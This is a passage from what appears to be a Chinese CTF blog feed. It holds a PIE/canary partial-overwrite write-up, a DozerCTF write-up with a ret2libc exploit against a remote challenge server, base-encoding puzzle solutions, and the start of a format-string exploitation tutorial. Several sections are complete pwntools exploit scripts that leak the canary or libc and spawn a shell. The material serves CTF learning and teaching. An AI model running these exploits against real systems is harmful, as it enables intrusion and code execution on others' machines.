class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>+<span class="number">1</span>))</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure><h5 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h5><p>虽然程序开启了 PIE ，但是由于低 12 位的页内偏移是固定的，也就 ida 中能看到的部分，这条题就是低三位。</p><p>后门函数的地址为：0xA3E。由于输入的时候是一个字节，也就是 0x3E 这样输入，但是第 4 个数字是随机的，所以我们需要找一个<strong>跳转 text 段</strong>、**第三位是 A **的rip 进行覆盖。</p><p>我们写入 name 的函数运行结束后会返回 main 函数，main 函数在 text 段(（0x555555554a3e）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> </span></span><br><span class="line">0x0000555555554a3d in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x60</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fffffffdc80 ◂— &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br><span class="line"> R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700</span><br><span class="line"> R9   0x3e</span><br><span class="line"> R10  0x36</span><br><span class="line"> R11  0x346</span><br><span class="line"> R12  0x555555554830 ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffddb0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0xdeadbeef</span><br><span class="line"> RSP  0x7fffffffdcb8 —▸ 0x555555554a3e ◂— push   rbp</span><br><span class="line"> RIP  0x555555554a3d ◂— ret    </span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x555555554a23    mov    eax, 0</span><br><span class="line">   0x555555554a28    mov    rcx, qword ptr [rbp - 8]</span><br><span class="line">   0x555555554a2c    xor    rcx, qword ptr fs:[0x28]</span><br><span class="line">   0x555555554a35    je     0x555555554a3c</span><br><span class="line">    ↓</span><br><span class="line">   0x555555554a3c    leave  </span><br></pre></td></tr></table></figure><p>所以在第二次输入 name 时溢出覆盖 rip 最后一个字节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x3e&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="利用程序-1"><a href="#利用程序-1" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babypie&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babypie&quot;</span>)</span><br><span class="line"></span><br><span class="line">getshell = <span class="number">0xA3E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>+<span class="number">1</span>))</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x3e&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 花式栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DozerCTF Writeup</title>
      <link href="archives/143/"/>
      <url>archives/143/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn-ret2-temp"><a href="#pwn-ret2-temp" class="headerlink" title="pwn - ret2 temp"></a>pwn - ret2 temp</h2><blockquote><p>一开始记得不是这个题目名字，应该是 ret2dl-resolve ，高大上东西不会</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h4><p>32 位动态链接；打开 NX ；</p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>read 函数栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h4><p>栈溢出，用 write 泄露 libc 地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><p>到 <a href="https://github.com/niklasb/libc-database">libc-database</a> 查远程的 libc 是：<a href="https://libc.blukat.me/d/libc6-i386_2.23-0ubuntu11_amd64.so">libc6-i386_2.23-0ubuntu11_amd64.so</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;118.31.11.216&quot;</span>,<span class="number">36666</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x0804851f</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;write_plt:&quot;</span>+<span class="built_in">hex</span>(write_plt))</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;write_got:&quot;</span>+<span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">write_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line"></span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#onegadget = 0x3ac5c + libc_base</span></span><br><span class="line"><span class="comment">#log.info(&quot;onegadget:&quot;+hex(onegadget))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment">#payload += p32(0x08048362) + p32(onegadget)</span></span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="RE-貌似有些不对"><a href="#RE-貌似有些不对" class="headerlink" title="RE - 貌似有些不对"></a>RE - 貌似有些不对</h2><p>上面字符串 base 加密，下面自定义 自定义密码表 ：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200614215140.png"></p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : base_diy.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义加密表</span></span><br><span class="line"><span class="comment">#s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;#原版</span></span><br><span class="line">s = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span><span class="comment">#自定义</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_encode</span>(<span class="params">inputs</span>):</span></span><br><span class="line"><span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">bin_str = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">x = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">bin_str.append(<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#print(bin_str)</span></span><br><span class="line"><span class="comment"># 输出的字符串</span></span><br><span class="line">outputs = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 不够三倍数，需补齐的次数</span></span><br><span class="line">nums = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> bin_str:</span><br><span class="line"><span class="comment">#每次取三个字符的二进制</span></span><br><span class="line">temp_list = bin_str[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(temp_list) != <span class="number">3</span>):</span><br><span class="line">nums = <span class="number">3</span> - <span class="built_in">len</span>(temp_list)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(temp_list) &lt; <span class="number">3</span>:</span><br><span class="line">temp_list += [<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>]</span><br><span class="line">temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line"><span class="comment">#print(temp_str)</span></span><br><span class="line"><span class="comment"># 将三个8字节的二进制转换为4个十进制</span></span><br><span class="line">temp_str_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">temp_str_list.append(<span class="built_in">int</span>(temp_str[i*<span class="number">6</span>:(i+<span class="number">1</span>)*<span class="number">6</span>],<span class="number">2</span>))</span><br><span class="line"><span class="comment">#print(temp_str_list)</span></span><br><span class="line"><span class="keyword">if</span> nums:</span><br><span class="line">temp_str_list = temp_str_list[<span class="number">0</span>:<span class="number">4</span> - nums]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> temp_str_list:</span><br><span class="line">outputs += s[i]</span><br><span class="line">bin_str = bin_str[<span class="number">3</span>:]</span><br><span class="line">outputs += nums * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">print(<span class="string">&quot;Encrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_decode</span>(<span class="params">inputs</span>):</span></span><br><span class="line"><span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">bin_str = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line"><span class="keyword">if</span> i != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">x = <span class="built_in">str</span>(<span class="built_in">bin</span>(s.index(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">bin_str.append(<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#print(bin_str)</span></span><br><span class="line"><span class="comment"># 输出的字符串</span></span><br><span class="line">outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">nums = inputs.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> bin_str:</span><br><span class="line">temp_list = bin_str[:<span class="number">4</span>]</span><br><span class="line">temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line"><span class="comment">#print(temp_str)</span></span><br><span class="line"><span class="comment"># 补足8位字节</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(temp_str) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">temp_str = temp_str[<span class="number">0</span>:-<span class="number">1</span> * nums * <span class="number">2</span>]</span><br><span class="line"><span class="comment"># 将四个6字节的二进制转换为三个字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">int</span>(<span class="built_in">len</span>(temp_str) / <span class="number">8</span>)):</span><br><span class="line">outputs += <span class="built_in">chr</span>(<span class="built_in">int</span>(temp_str[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">bin_str = bin_str[<span class="number">4</span>:]</span><br><span class="line">print(<span class="string">&quot;Decrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;     *    (1)encode         (2)decode    *&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;Please select the operation you want to perform:\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(num == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be encrypted: \n&quot;</span>)</span><br><span class="line">My_base64_encode(input_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be decrypted: \n&quot;</span>)</span><br><span class="line">My_base64_decode(input_str)</span><br></pre></td></tr></table></figure><h2 id="Crypto-真·签到"><a href="#Crypto-真·签到" class="headerlink" title="Crypto - 真·签到"></a>Crypto - 真·签到</h2><p>给的一个程序，运行不起来，IDA 打开就很奇怪，然后随手往记事本一带，发现一串字符串。看这样子像是 base 64 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R00yVE1NWlRIRTJFRU5CWUdVM1RNUlJURzRaVEtOUllHNFpUTU9CV0lJM0RRTlJXRzQ0VE9OSlhHWTJET05aUkc1QVRPTUJUR0kyRUVNWlZHNDNUS05aWEc0MlRHTkpaR1pBVElNUldHNDNUT05KVUc0M0RPTUJXR0kyRUtOU0ZHTTRUT09CVUc0M0VFPT09Cgo&#x3D;</span><br></pre></td></tr></table></figure><p>加密之后长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GM2TMMZTHE2EENBYGU3TMRRTG4ZTKNRYG4ZTMOBWII3DQNRWG44TONJXGY2DONZRG5ATOMBTGI2EEMZVG43TKNZXG42TGNJZGZATIMRWG43TONJUG43DOMBWGI2EKNSFGM4TOOBUG43EE&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>然后联想 base 32 的占位符（也就是 = ）的可能是 6、4、3、1 个，又顺手解密后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3563394B48576F37356873686B686679757647717A70324B3577577753596A426777547670624E6E3978476B</span><br></pre></td></tr></table></figure><p>然后就是 16 进制转换字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5c9KHWo75hshkhfyuvGqzp2K5wWwSYjBgwTvpbNn9xGk</span><br></pre></td></tr></table></figure><p>然后再转一个 base 58 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dozerctf&#123;base_family_is_so_good&#125;</span><br></pre></td></tr></table></figure><p>其实这种多重加密，用 CyberChef 能自动解出来一部分，这题的最后两步就是自动解出来的：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200613155002.png"></p><p>点击下面链接可以查看整个解密流程：<br><code>https://skyedai910.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)From_Base32(&#39;A-Z2-7%3D&#39;,true)From_Hex(&#39;None&#39;)From_Base58(&#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#39;,false)&amp;input=UjAweVZFMU5XbFJJUlRKRlJVNUNXVWRWTTFSTlVsSlVSelJhVkV0T1VsbEhORnBVVFU5Q1YwbEpNMFJSVGxKWFJ6UTBWRTlPU2xoSFdUSkVUMDVhVWtjMVFWUlBUVUpVUjBreVJVVk5XbFpITkROVVMwNWFXRWMwTWxSSFRrcGFSMXBCVkVsTlVsZEhORE5VVDA1S1ZVYzBNMFJQVFVKWFIwa3lSVXRPVTBaSFRUUlVUMDlDVlVjME0wVkZQVDA5Q2dvPQ</code></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> DozerCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞基础利用</title>
      <link href="archives/5bd18a78/"/>
      <url>archives/5bd18a78/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞基础利用"><a href="#格式化字符串漏洞基础利用" class="headerlink" title="格式化字符串漏洞基础利用"></a>格式化字符串漏洞基础利用</h1><blockquote><p>阅读 ctf-wiki 后总结</p></blockquote><h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址</li><li>盲打，dump 整个程序，获取有用信息。</li></ul></li></ul><h3 id="简单的泄露栈内存"><a href="#简单的泄露栈内存" class="headerlink" title="简单的泄露栈内存"></a>简单的泄露栈内存</h3><p>例如，给定如下程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># file:leakmemory.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);<span class="comment">//格式化字符串漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>32 位程序使用的是栈传参，64 位系统前 7 个参数是用寄存器传参。32 位程序可以直接利用格式化字符串泄露出存在栈上的参数。（64 位要对应调整）</p><p>编译 32 位程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c</span><br></pre></td></tr></table></figure><p>输入输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;%p.%p.%p</span></span><br><span class="line">00000001.22222222.ffffffff.%p.%p.%p</span><br><span class="line">0xffffcd10.0xc2.0xf7e8b6bb</span><br></pre></td></tr></table></figure><p>栈情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">────[ stack ]────</span><br><span class="line">[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]</span><br><span class="line">8</span><br><span class="line">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp</span><br><span class="line">0xffffcd00│+0x04: 0xffffcd10  →  